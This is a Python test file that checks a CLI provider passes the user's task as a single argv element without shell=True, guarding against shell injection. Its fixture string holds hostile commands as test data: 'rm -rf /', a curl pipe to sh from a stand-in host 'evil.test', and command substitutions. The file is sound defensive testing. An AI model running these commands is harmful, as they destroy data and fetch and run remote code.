"""Security guard: the COUNCIL dispatch passes the user's task as a single argv
element — never a shell string — so a task with shell metacharacters can't inject.

This is the primary dispatch path: every council member runs through
providers.CLIProvider.run → _run_command → run_with_runtime_env(command, ...). The
task is `command.append(prompt)` onto a list[str] handed to run_with_runtime_env with
NO `shell=` — so `claude -p '...; rm -rf / ...'` reaches the CLI as one literal
argument, never parsed by a shell. test_provider_effort_injection captures the command
list incidentally (proving effort POSITIONING), but nothing pins the security invariant
itself with an adversarial input. A future refactor to `shell=True` (or os.system, or
joining the command into a string for "convenience") would turn the task into a shell
expression — arbitrary command execution from any prompt — and the effort test might
not obviously flag it as a SECURITY break. Sibling of test_capture_host_dispatch_argv_
safe (which guards the OTHER dispatch path, the extension auto-dispatch).

Captures at the run_with_runtime_env boundary (the real subprocess call) and asserts:
the command is a LIST (not a shell string), the metacharacter task is exactly one
element, and `shell=True` is never passed. Mutation: switch _run_command to a joined
string + shell=True → the list/shell assertions red.
"""
from __future__ import annotations

from pathlib import Path
from types import SimpleNamespace

from trinity_local.config import ProviderConfig

# A task loaded with every shell metacharacter that would matter under shell=True.
_EVIL = "refactor this; rm -rf / && curl http://evil.test | sh $(whoami) `id` > /tmp/x #"


def _config(name="claude"):
    return ProviderConfig(
        name=name, type="cli", enabled=True, label=name.title(),
        command=[name, "-p"], args=[], task_types=set(), model=None, effort=None,
    )


def test_council_dispatch_passes_task_as_single_argv_element(monkeypatch):
    from trinity_local import providers

    captured: dict = {}

    def fake_run_with_runtime_env(command, **kwargs):
        captured["command"] = command
        captured["kwargs"] = kwargs
        return SimpleNamespace(stdout="ok", stderr="", returncode=0)

    # Patch the real subprocess boundary; make the binary "found" (without
    # stubbing _ensure_binary's logic) so dispatch reaches _run_command; and
    # force the subprocess path (skip MCP-host sampling, which would short-
    # circuit a claude dispatch before any command is built).
    monkeypatch.setattr(providers, "run_with_runtime_env", fake_run_with_runtime_env)
    monkeypatch.setattr(providers, "which_on_runtime_path", lambda *_: "/usr/bin/claude")
    monkeypatch.setattr(providers.CLIProvider, "_try_sampling", lambda *_: None)

    providers.CLIProvider(_config()).run(_EVIL, Path("."))

    command = captured["command"]
    kwargs = captured["kwargs"]
    # 1. argv LIST, not a shell string — the structural guarantee.
    assert isinstance(command, list), f"dispatch built a non-list command ({type(command).__name__}) — shell-injection risk"
    # 2. The metacharacter task is exactly ONE element (not split, not interpolated
    #    into a flag) — so the shell never sees it.
    assert command.count(_EVIL) == 1 and command[-1] == _EVIL, (
        f"the task is not a single trailing argv element: {command!r}"
    )
    # 3. shell=True is NEVER passed — the actual injection invariant.
    assert kwargs.get("shell") is not True, "run_with_runtime_env called with shell=True — command injection"
    # 4. No element is the joined shell expression (defense against a string-join refactor).
    assert not any(isinstance(c, str) and "rm -rf" in c and c != _EVIL for c in command), (
        "the task leaked into a joined shell fragment"
    )
